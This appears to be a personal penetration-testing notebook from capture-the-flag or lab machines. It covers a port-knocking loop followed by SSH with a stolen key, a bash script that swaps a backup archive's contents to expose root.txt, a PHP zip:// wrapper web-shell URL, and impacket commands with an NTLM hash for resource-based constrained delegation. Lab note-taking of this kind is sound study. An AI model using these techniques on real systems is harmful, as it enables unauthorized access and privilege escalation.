found this process

knockd watches for TCP SYN packets

#knockd

![[Pasted image 20250605204801.png]]

it says that if I knock on port 571 > 290 >911 in that order within 5 seconds it will open the port for my own IP

going back on my machine I added the RSA key

nano ~/id_rsa_nineveh_amrois

![[Pasted image 20250605205342.png]]

chmod 600 ~/id_rsa_nineveh_amrois

then

1.
# 1. Start a loop to send TCP SYN packets (knocks) to the target ports
for i in 571 290 911; do

2.
  # 2. Use nmap to send a single SYN packet to each port silently
  #    -Pn            â Skip host discovery (assume host is up)
  #    --host-timeout 100 â Timeout quickly (100ms per host)
  #    --max-retries 0    â No retries, send only one probe
  #    -p $i          â Target port in current iteration
  #    >/dev/null     â Discard output (silent knock)
  
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.129.245.191 >/dev/null  


# 3. End the loop, then immediately attempt SSH connection using the private key

3.
done; ssh -i ~/id_rsa_nineveh_amrois amrois@10.129.245.191
# -i <key>       â Specify private key file for auth
# amrois@IP      â Username and IP of the remote machine
# This only works if the knock sequence opened port 22 (SSH)

found this script


#!/bin/bash

# work out of shm
cd /dev/shm

# set both start and cur equal to any backup file if it's there
start=$(find /var/tmp -maxdepth 1 -type f -name ".*")
cur=$(find /var/tmp -maxdepth 1 -type f -name ".*")

# loop until there's a change in cur
echo "Waiting for archive filename to change..."
while [ "$start" == "$cur" -o "$cur" == "" ] ; do
    sleep 10;
    cur=$(find /var/tmp -maxdepth 1 -type f -name ".*");
done

# Grab a copy of the archive
echo "File changed... copying here"
cp $cur .

# get filename
fn=$(echo $cur | cut -d'/' -f4)

# extract archive
tar -zxf $fn

# remove robots.txt and replace it with link to root.txt
rm var/www/html/robots.txt
ln -s /root/root.txt var/www/html/robots.txt

# remove old archive
rm $fn

# create new archive
tar czf $fn var

# put it back, and clean up
mv $fn $cur
rm $fn
rm -rf var

# wait for results
echo "Waiting for new logs..."
tail -f /var/backups/onuma_backup_error.txt

#zip

PHP has a zip:\\ wrapper that can execute files

the syntax is

http://192.168.101.229/index.php?file=zip://uploads/upload_1750195221.zip%23simple-backdoor&cmd=id

note: the %23 is a # but URL encoded this is how the zip wrapper works, the part before the # is the zip and the part after is the name of the file inside the zip. And due to the script that we decoded earlier, we know that the PHP is directly added at the end

#constraineddelegation

we need to do a Ressource based constrained delegation, because we have genericall over a computer and not a user or a group

![[Pasted image 20250711004939.png]]

impacket-addcomputer resourced.local/l.livingstone -dc-ip  192.168.217.175  -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'HERO$' -computer-pass 'Password123!'

note: the ‘$’ is important

![[Pasted image 20250711003119.png]]

we then use RBCD.py (in active directory folder)

sudo python3 rbcd.py  -dc-ip 192.168.217.175 -t RESOURCEDC -f 'HERO' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone

![[Pasted image 20250711003503.png]]

Now we can request a service ticket
